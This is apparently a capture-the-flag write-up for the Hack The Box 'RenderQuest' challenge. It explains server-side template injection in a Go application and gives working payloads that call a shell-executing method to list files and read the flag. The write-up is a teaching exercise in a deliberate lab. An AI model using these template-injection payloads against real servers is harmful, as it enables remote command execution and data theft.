# RenderQuest HTB Challenge 

__________________________________________
The challenge say:
"**You provide the templates, we provide the data!**"
Translated: SSTI

We know from the files that the templates are working with "golang"

### SSTI + RCE

##### Steps To Test SSTI

1. Start a local python server `python3 -m http.server 80`
2. Start ngrok: `ngrok http 80`
3. Make a index.html file were we will Write inside one (or more) of the template found in the website of the challenge like this: `{{ .ServerInfo.KernelVersion }}`
4. Copy the *ngrok* URL and paste into the field in the challenge site and press render now.
5. Now browse the ngrok url so we can see the rendered template into the page.

### Exploit

In "main.go" there is an interesting function:

```go
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
```

The Function "FetchServerInfo()"" execute a shell command and we can decide the command:

If we use: `{{.FetchServerInfo "ls -la"}}` we can start to look for the flag file.
Then when we find the file: `{{.FetchServerInfo "cat ../flag_RanDoM_stRinG_.txt" }}`
